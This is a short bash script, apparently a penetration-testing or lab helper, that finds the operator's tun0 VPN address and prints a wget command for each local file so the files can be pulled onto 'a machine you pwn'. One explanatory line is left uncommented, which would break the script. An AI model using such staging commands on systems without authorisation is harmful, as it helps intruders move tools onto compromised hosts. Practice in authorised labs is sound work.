#!/bin/bash

Run in current directory and you will get a wget command for each file, to use on a machine you pwn.

# One liner
# IP_ADDRESS=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}') && [ -n "$IP_ADDRESS" ] && for file in *; do [ -f "$file" ] && echo "wget http://$IP_ADDRESS/$file"; done

# Get the IP address of tun0
IP_ADDRESS=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

# Check if the IP address was retrieved
if [ -z "$IP_ADDRESS" ]; then
  echo "Could not find IP address for tun0. Make sure the interface is up."
  exit 1
fi

# Iterate over each file in the current directory
for file in *; do
  # Check if it's a regular file
  if [ -f "$file" ]; then
    echo "wget http://$IP_ADDRESS/$file"
  fi
done
